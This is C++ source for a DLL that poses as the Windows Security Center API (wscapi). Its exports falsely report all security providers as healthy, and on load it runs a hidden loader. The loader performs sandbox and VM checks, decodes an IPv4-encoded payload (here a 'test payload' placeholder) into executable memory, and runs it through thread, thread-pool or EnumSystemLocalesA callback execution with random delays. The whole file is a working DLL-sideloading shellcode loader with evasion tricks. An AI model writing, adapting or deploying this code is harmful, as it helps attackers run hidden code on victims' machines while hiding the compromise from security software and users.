// wscapi.cpp
#include "pch.h"
#include <windows.h>
#include <cstdio>
#include <cstdarg>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <ctime>

extern "C" {
    // WscRegisterForChanges - register for security center changes
    __declspec(dllexport) HRESULT WINAPI WscRegisterForChanges(
        LPVOID Reserved,
        LPVOID phCallbackRegistration,
        LPVOID lpCallbackAddress,
        PVOID pContext
    ) {
        return S_OK; // return success
    }

    // WscUnRegisterForChanges - unregister from changes
    __declspec(dllexport) HRESULT WINAPI WscUnRegisterForChanges(
        LPVOID hRegistration
    ) {
        return S_OK;
    }

    // WscGetSecurityProviderHealth - get antivirus/firewall status
    __declspec(dllexport) HRESULT WINAPI WscGetSecurityProviderHealth(
        DWORD Providers,
        LPVOID pHealth
    ) {
        if (pHealth) {
            // report all security providers as healthy
            *(DWORD*)pHealth = 0; // WSC_SECURITY_PROVIDER_HEALTH_GOOD
        }
        return S_OK;
    }

    // additional exports for compatibility
    __declspec(dllexport) HRESULT WINAPI WscRegisterForUserNotifications() {
        return S_OK;
    }

    __declspec(dllexport) HRESULT WINAPI WscGetAntiMalwareUri(LPVOID ppszUri) {
        return S_OK;
    }

    __declspec(dllexport) HRESULT WINAPI WscNotify(DWORD dwNotifyType, LPVOID pData) {
        return S_OK;
    }

    __declspec(dllexport) HRESULT WINAPI WscQuerySecurityProviderHealth(
        LPVOID pQuery, LPVOID pResult
    ) {
        return S_OK;
    }
}

// export by ordinal for compatibility
#pragma comment(linker, "/EXPORT:WscRegisterForChanges=_WscRegisterForChanges@16,@1")
#pragma comment(linker, "/EXPORT:WscUnRegisterForChanges=_WscUnRegisterForChanges@4,@2")
#pragma comment(linker, "/EXPORT:WscGetSecurityProviderHealth=_WscGetSecurityProviderHealth@8,@3")

// simple vm-friendly environment checks
static BOOL IsEnvironmentSafe() {
    // initialize random seed
    srand((unsigned)time(NULL) ^ GetCurrentProcessId());

    // check 1: basic timing check (vms handle this fine)
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    // do some simple work
    volatile int sum = 0;
    for (int i = 0; i < 1000000; i++) {
        sum += i;
    }

    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;

    // should take at least some measurable time
    if (elapsed < 0.001) {  // less than 1ms is suspicious
        return FALSE;
    }

    // check 2: cpu core count (most vms have at least 2 cores now)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return FALSE;  // single core is rare nowadays
    }

    // check 3: check for user interaction capability
    if (GetSystemMetrics(SM_REMOTESESSION)) {
        // rdp session - this is ok for testing
        // just be aware we're in rdp
    }

    // check 4: simple heap check
    HANDLE heap = GetProcessHeap();
    if (!heap || !HeapValidate(heap, 0, NULL)) {
        return FALSE;
    }

    return TRUE;  // environment looks good
}

// get current process name
static BOOL GetCurrentProcessName(char* buffer, size_t size) {
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) {
        return FALSE;
    }

    char* lastSlash = strrchr(path, '\\');
    if (lastSlash) {
        strncpy_s(buffer, size, lastSlash + 1, _TRUNCATE);
    } else {
        strncpy_s(buffer, size, path, _TRUNCATE);
    }

    return TRUE;
}

// check if we should execute based on process name
static BOOL ShouldExecuteInProcess() {
    char procName[MAX_PATH];
    if (!GetCurrentProcessName(procName, sizeof(procName))) {
        return TRUE;  // continue on error
    }

    // convert to lowercase for comparison
    for (char* p = procName; *p; p++) {
        *p = (char)tolower(*p);
    }

    // skip certain processes to avoid issues
    const char* skipList[] = {
        "csrss.exe",
        "winlogon.exe",
        "services.exe",
        "lsass.exe",
        "smss.exe",
        NULL
    };

    for (int i = 0; skipList[i] != NULL; i++) {
        if (strcmp(procName, skipList[i]) == 0) {
            return FALSE;  // don't execute in critical system processes
        }
    }

    return TRUE;
}

static const char* Ipv4Array[] = {
    "116.101.115.116",     "32.112.97.121",       "108.111.97.100",      "10.0.0.0"};

#define NumberOfElements (sizeof(Ipv4Array)/sizeof(Ipv4Array[0]))

static BOOL DecodePayload(BYTE** ppBuf, DWORD* pSize) {
    SIZE_T total = NumberOfElements * 4;

    // allocate memory with rw permissions (not rwx)
    LPVOID allocAddr = VirtualAlloc(
        NULL,
        total,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!allocAddr) {
        return FALSE;
    }

    BYTE* buf = (BYTE*)allocAddr;

    // decode each ipv4 address
    for (DWORD i = 0; i < NumberOfElements; i++) {
        unsigned int b0, b1, b2, b3;
        if (sscanf(
            Ipv4Array[i],
            "%u.%u.%u.%u",
            &b0, &b1, &b2, &b3
        ) != 4) {
            VirtualFree(buf, 0, MEM_RELEASE);
            return FALSE;
        }

        // simple xor with index for basic obfuscation
        buf[i * 4 + 0] = (BYTE)(b0 ^ (i & 0xFF));
        buf[i * 4 + 1] = (BYTE)(b1 ^ (i & 0xFF));
        buf[i * 4 + 2] = (BYTE)(b2 ^ (i & 0xFF));
        buf[i * 4 + 3] = (BYTE)(b3 ^ (i & 0xFF));
    }

    // decode xor
    for (DWORD i = 0; i < total; i += 4) {
        DWORD idx = i / 4;
        buf[i + 0] ^= (idx & 0xFF);
        buf[i + 1] ^= (idx & 0xFF);
        buf[i + 2] ^= (idx & 0xFF);
        buf[i + 3] ^= (idx & 0xFF);
    }

    // change memory protection to executable
    DWORD oldProtect;
    if (!VirtualProtect(allocAddr, total, PAGE_EXECUTE_READ, &oldProtect)) {
        // try rwx as fallback
        if (!VirtualProtect(allocAddr, total, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            VirtualFree(allocAddr, 0, MEM_RELEASE);
            return FALSE;
        }
    }

    // flush cpu instruction cache
    FlushInstructionCache(GetCurrentProcess(), allocAddr, total);

    *ppBuf = buf;
    *pSize = static_cast<DWORD>(total);

    return TRUE;
}

// method 1: standard thread execution with delay
static BOOL ExecuteViaThread(BYTE* shellcode, DWORD size) {
    // random delay between 1-3 seconds
    Sleep(1000 + (rand() % 2000));

    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)shellcode,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        return FALSE;
    }

    CloseHandle(hThread);
    return TRUE;
}

// method 2: queue user work item (thread pool)
static BOOL ExecuteViaThreadPool(BYTE* shellcode, DWORD size) {
    BOOL result = QueueUserWorkItem(
        (LPTHREAD_START_ROUTINE)shellcode,
        NULL,
        WT_EXECUTEDEFAULT
    );
    return result;
}

// method 3: callback-based execution
static BOOL ExecuteViaCallback(BYTE* shellcode, DWORD size) {
    // use EnumSystemLocalesA as a callback mechanism
    EnumSystemLocalesA((LOCALE_ENUMPROCA)shellcode, LCID_SUPPORTED);
    return TRUE;
}

// choose execution method based on environment
static BOOL ExecutePayload(BYTE* shellcode, DWORD size) {
    // try different methods based on random selection
    int method = rand() % 3;

    switch (method) {
        case 0:
            return ExecuteViaThread(shellcode, size);
        case 1:
            return ExecuteViaThreadPool(shellcode, size);
        case 2:
            return ExecuteViaCallback(shellcode, size);
        default:
            return ExecuteViaThread(shellcode, size);
    }
}

static volatile LONG g_Initialized = 0;

// worker function that runs in separate thread
static DWORD WINAPI PayloadWorker(LPVOID lpParam) {
    // initial delay
    Sleep(3000 + (rand() % 2000));  // 3-5 seconds

    // check environment
    if (!IsEnvironmentSafe()) {
        return 0;
    }

    // check process name
    if (!ShouldExecuteInProcess()) {
        return 0;
    }

    // decode payload
    BYTE* payload = nullptr;
    DWORD payloadSize = 0;

    if (!DecodePayload(&payload, &payloadSize)) {
        return 0;
    }

    // execute using selected method
    ExecutePayload(payload, payloadSize);

    // note: we don't free the payload memory since it's being executed
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH: {
        // ensure single initialization
        if (InterlockedCompareExchange(&g_Initialized, 1, 0) != 0) {
            break;
        }

        // disable thread library calls
        DisableThreadLibraryCalls(hModule);

        // create worker thread to avoid loader lock
        HANDLE hWorker = CreateThread(
            NULL,
            0,
            PayloadWorker,
            NULL,
            0,
            NULL
        );

        if (hWorker) {
            CloseHandle(hWorker);
        }

        break;
    }

    case DLL_PROCESS_DETACH:
        // cleanup if needed
        break;
    }

    return TRUE;
}
